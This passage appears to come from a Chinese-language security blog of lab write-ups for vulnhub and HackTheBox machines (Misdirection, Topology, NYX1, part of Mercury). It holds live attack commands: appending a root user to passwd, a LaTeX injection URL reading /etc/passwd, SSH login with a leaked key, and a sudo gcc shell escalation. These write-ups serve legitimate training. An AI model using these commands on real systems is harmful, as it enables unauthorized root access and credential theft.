class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">brexit@misdirection:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;hack:zSZ7Whrr8hgwY:0:0::/root/:/etc/bash&#x27;</span> &gt;&gt;/bin/passwd<br><br>brexit@misdirection:~$ su hack<br>su hack<br>Password: 123456<br>root@misdirection:/home/brexit<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@misdirection:/home/brexit<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@misdirection:/root<span class="hljs-comment"># cat root.txt </span><br><span class="hljs-built_in">cat</span> root.txt<br>0d2c6222bfdd3701e0fa12a9a9dc9c8c<br>root@misdirection:/root<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:20:a6:ad brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.139/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1045sec preferred_lft 1045sec<br>    inet6 fe80::20c:29ff:fe20:a6ad/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@misdirection:/root<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux misdirection 4.15.0-212-generic <span class="hljs-comment">#223-Ubuntu SMP Tue May 23 13:09:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><p>红队笔记视频中的操作更舒服一些，顺便记录一下他的手法。首先使用 openssl 来生成哈希值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">brexit@misdirection:~$ openssl passwd -1 123456<br>openssl passwd -1 123456<br>$1<span class="hljs-variable">$FE</span>.gLBgw<span class="hljs-variable">$N3gdTUY9k04o7TtwcU</span>/HS/<br></code></pre></td></tr></table></figure><p>然后查看 passwd 中 root 用户的格式内容，将用户和 x 替换为自己的就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">brexit@misdirection:~$ <span class="hljs-built_in">cat</span> /etc/passwd | grep root<br><span class="hljs-built_in">cat</span> /etc/passwd | grep root<br>root:x:0:0:root:/root:/bin/bash<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Topology靶机</title>
    <link href="/2023/06/5ded43f5bb93.html"/>
    <url>/2023/06/5ded43f5bb93.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://latex.topology.htb/equation.php?eqn=%<span class="hljs-number">24</span>\lstinputlisting&#123;%<span class="hljs-number">2</span>Fetc%<span class="hljs-number">2</span>Fpasswd&#125;%<span class="hljs-number">24</span>`&amp;submit=<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NYX1</title>
    <link href="/2023/06/1d78c8deaa4a.html"/>
    <url>/2023/06/1d78c8deaa4a.html</url>
    
    <content type="html"><![CDATA[<h1 id="NYX1-靶机"><a href="#NYX1-靶机" class="headerlink" title="NYX1 靶机"></a>NYX1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.138<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00020s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:A7:F7:7B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.05 seconds<br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -sC -p22,80 192.1.1.138<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00047s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 <span class="hljs-built_in">fc</span>:8b:87:f4:36:<span class="hljs-built_in">cd</span>:7d:0f:d8:f3:16:15:a9:47:f1:0b (RSA)<br>|   256 b4:5c:08:96:02:c6:a8:0b:01:fd:49:68:<span class="hljs-built_in">dd</span>:aa:fb:3a (ECDSA)<br>|_  256 cb:bf:22:93:69:76:60:a4:7d:c0:19:f3:c7:15:e7:3c (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: nyx<br>|_http-server-header: Apache/2.4.38 (Debian)<br>MAC Address: 00:0C:29:A7:F7:7B (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.27 seconds<br></code></pre></td></tr></table></figure><p>开放了 22 和 80 端口，Linux 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.138<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00027s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   open|filtered ntp<br>135/udp   closed        msrpc<br>137/udp   open|filtered netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  open|filtered upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 00:0C:29:A7:F7:7B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.84 seconds<br></code></pre></td></tr></table></figure><p>udp 的扫描结果仅供参考</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.1.1.138          <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:29 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00023s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-enum: <br>|_  /d41d8cd98f00b204e9800998ecf8427e.php: Seagate BlackArmorNAS 110/220/440 Administrator Password Reset Vulnerability<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">MAC Address: 00:0C:29:A7:F7:7B (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.85 seconds</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>同时，gobuster 开启爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.138/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t64 -x txt,zip,sql,rar,php    <br>===============================================================<br>Gobuster v3.2.0-dev<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.138/<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.2.0-dev<br>[+] Extensions:              txt,zip,sql,rar,php<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/16 22:29:24 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 276]<br>/key.php              (Status: 200) [Size: 287]<br>/.php                 (Status: 403) [Size: 276]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 1319237 / 1323366 (99.69%)===============================================================<br>2023/06/16 22:31:41 Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>目录爆破的结果中 key.php 是个感兴趣的目录，但是打开网页后发现，没有明显的可以被利用的点，尝试了绕过和爆破都没有成功。</p><h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>自带漏洞脚本的扫描结果，给出了一个 php 文件</p><p><img src="/pic/9528631759b5123a2e4f71f2e36077af_MD5.png"></p><p>看起来是私钥文件的内容，title 中给了一些敏感信息 <code>mpampis key</code>，猜测可能是 <code>mpampis</code> 的私钥文件，尝试使用私钥登录，一开始忘了文件权限的问题，修改权限为 600 才登录成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/nyx]<br>└─$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;rW1gDQ8R+yFNAAAAC21wYW1waXNAbnl4AQIDBAUGBw==&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>�!M<br>   mpampis@nyx<br>   <br>┌──(kali㉿kali)-[~/Downloads/nyx]<br>└─$ ssh -i private mpampis@192.1.1.138      <br>The authenticity of host <span class="hljs-string">&#x27;192.1.1.138 (192.1.1.138)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:y+UuWVNQjou5NV3bhJKmkFBqomxtGR0c5ydJPwmIz+E.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.1.1.138<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">Permissions 0644 for &#x27;</span>private<span class="hljs-string">&#x27; are too open.</span><br><span class="hljs-string">It is required that your private key files are NOT accessible by others.</span><br><span class="hljs-string">This private key will be ignored.</span><br><span class="hljs-string">Load key &quot;private&quot;: bad permissions</span><br><span class="hljs-string">mpampis@192.1.1.138\&#x27;</span>s password: <br>Permission denied, please try again.<br>mpampis@192.1.1.138\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">mpampis@192.1.1.138\&#x27;</span>s password: <br>mpampis@192.1.1.138: Permission denied (publickey,password).<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/nyx]<br>└─$ <span class="hljs-built_in">chmod</span> 600 private     <br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/nyx]<br>└─$ ssh -i private mpampis@192.1.1.138<br>Linux nyx 4.19.0-10-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.132-1 (2020-07-24) x86_64</span><br>███▄▄▄▄   ▄██   ▄   ▀████    ▐████▀ <br>███▀▀▀██▄ ███   ██▄   ███▌   ████▀  <br>███   ███ ███▄▄▄███    ███  ▐███    <br>███   ███ ▀▀▀▀▀▀███    ▀███▄███▀    <br>███   ███ ▄██   ███    ████▀██▄     <br>███   ███ ███   ███   ▐███  ▀███    <br>███   ███ ███   ███  ▄███     ███▄  <br> ▀█   █▀   ▀█████▀  ████       ███▄ <br>Last login: Fri Aug 14 19:15:05 2020 from 192.168.1.18<br>mpampis@nyx:~$<br></code></pre></td></tr></table></figure><h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">mpampis@nyx:~$ <span class="hljs-built_in">cat</span> user.txt <br>2cb67a256530577868009a5944d12637<br>mpampis@nyx:~$ <span class="hljs-built_in">ls</span> -liah<br>total 36K<br>138973 drwxr-xr-x 4 mpampis mpampis 4.0K Aug 14  2020 .<br>    19 drwxr-xr-x 3 root    root    4.0K Aug 14  2020 ..<br>139223 -rw------- 1 mpampis mpampis  490 Aug 14  2020 .bash_history<br>138974 -rw-r--r-- 1 mpampis mpampis  220 Aug 14  2020 .bash_logout<br>138975 -rw-r--r-- 1 mpampis mpampis 3.5K Aug 14  2020 .bashrc<br>139220 drwxr-xr-x 3 mpampis mpampis 4.0K Aug 14  2020 .<span class="hljs-built_in">local</span><br>138976 -rw-r--r-- 1 mpampis mpampis  807 Aug 14  2020 .profile<br>139214 drwx------ 2 mpampis mpampis 4.0K Aug 14  2020 .ssh<br>138981 -rw-r--r-- 1 root    root      33 Aug 14  2020 user.txt<br>mpampis@nyx:~$ <span class="hljs-built_in">tail</span> -n 20 .bash_history <br><span class="hljs-built_in">cd</span> /tmp<br>bash exp.sh <br><span class="hljs-built_in">exit</span><br>bash exp.sh <br><span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">cat</span> exp.sh <br><span class="hljs-built_in">chmod</span> 04755 rootshell<br>bash exp.sh <br><span class="hljs-built_in">ls</span> -la<br>find / -perm -4000 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;<br><span class="hljs-built_in">which</span> screen<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">cd</span> /tmpb<br><span class="hljs-built_in">cd</span> /tmp<br>bash exp.sh <br>screen -r<br>bash exp.sh <br>screen -S listen_for_exception<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br><br>mpampis@nyx:/tmp$ <span class="hljs-built_in">ls</span><br>systemd-private-2647caf04ec346c69dee7cb0c91684b3-apache2.service-WJsXbP<br>systemd-private-2647caf04ec346c69dee7cb0c91684b3-systemd-timesyncd.service-sGyxMv<br>mpampis@nyx:/tmp$ <span class="hljs-built_in">cd</span> -<br>/home/mpampis<br>mpampis@nyx:~$ <span class="hljs-built_in">cat</span> .bash_history | grep <span class="hljs-string">&quot;exp.sh&quot;</span><br>bash exp.sh <br>bash exp.sh <br>bash exp.sh <br><span class="hljs-built_in">cat</span> exp.sh <br>bash exp.sh <br>bash exp.sh <br>bash exp.sh<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>bash_history 文件中的信息意义不大。<code>sudo -l</code> 发现有 gcc 的权限，并且不需要密码，借助于 gtfobin，迅速找到了方法。</p><p><img src="/pic/d1e81af3774176142e24e8cc59f7ad7e_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">mpampis@nyx:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> mpampis on nyx:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User mpampis may run the following commands on nyx:<br>    (root) NOPASSWD: /usr/bin/gcc<br>mpampis@nyx:~$ <span class="hljs-built_in">cd</span> /tmp<br>mpampis@nyx:/tmp$ sudo gcc -wrapper /bin/sh,-s .<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls</span><br>root.txt<br><span class="hljs-comment"># cat root.txt</span><br></code></pre></td></tr></table></figure><h2 id="补充：key-php-文件"><a href="#补充：key-php-文件" class="headerlink" title="补充：key .php 文件"></a>补充：key .php 文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat key.php</span><br>&lt;?php<br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-string">&#x27;1165685715469&#x27;</span>)&#123;<br>        header(<span class="hljs-string">&quot;Location: d41d8cd98f00b204e9800998ecf8427e.php&quot;</span>);<br>        <span class="hljs-built_in">exit</span>;<br>&#125; elseif (<span class="hljs-variable">$key</span> == <span class="hljs-string">&quot;admin&quot;</span> or <span class="hljs-variable">$key</span> == <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h3&gt;really? lol&lt;/h3&gt;&lt;/center&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h3&gt;try harder kiddo&lt;/h3&gt;&lt;/center&gt;&quot;</span>;<br>&#125;<br>?&gt;<br><br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>&lt;title&gt;key&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;center&gt;<br>&lt;h2&gt;can u find the key!?&lt;/h2&gt;<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>    Enter the key: &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;key&quot;</span>/&gt;<br>    &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>THE PLANETS MERCURY</title>
    <link href="/2023/06/b0b39d4ac246.html"/>
    <url>/2023/06/b0b39d4ac246.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>靶机精讲之THE PLANETS MERCURY，一台vulnhub靶机，标准攻击链明快利落，让你学的每一点渗透知识都非常有价值，用到的都是大路知识，并不冷门。算是一台攻击链样板机了。</p></blockquote><h1 id="THE-PLANETS-MERCURY-靶机"><a href="#THE-PLANETS-MERCURY-靶机" class="headerlink" title="THE PLANETS MERCURY 靶机"></a>THE PLANETS MERCURY 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.115    <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-15 07:58 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.115<br>Host is up (0.00072s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:D5:99:58 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.18 seconds<br></code></pre></td></tr></table></figure><p>端口扫描的结果显示，TCP 端口中开启了 22 和 8080 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 